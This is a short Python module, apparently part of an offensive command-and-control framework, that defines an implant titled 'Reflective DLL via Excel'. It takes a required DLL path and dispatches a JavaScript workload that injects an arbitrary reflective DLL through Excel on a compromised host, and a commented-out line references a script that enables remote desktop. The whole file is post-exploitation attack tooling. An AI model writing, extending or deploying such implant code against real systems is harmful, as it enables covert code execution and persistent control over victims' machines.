import core.implant

class ExcelReflectJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(str(self.errno))

class ExcelReflectImplant(core.implant.Implant):

    NAME = "Reflective DLL via Excel"
    DESCRIPTION = "Executes an arbitrary reflective DLL."
    AUTHORS = ["RiskSense, Inc."]

    def load(self):
        self.options.register("DLLPATH", "", "the DLL to inject", required=True)

    def run(self):
        workloads = {}
        #workloads["vbs"] = self.load_script("data/implant/manage/enable_rdesktop.vbs", self.options)
        workloads["js"] = self.loader.load_script("data/implant/inject/reflectdll_excel.js", self.options)

        self.dispatch(workloads, ExcelReflectJob)
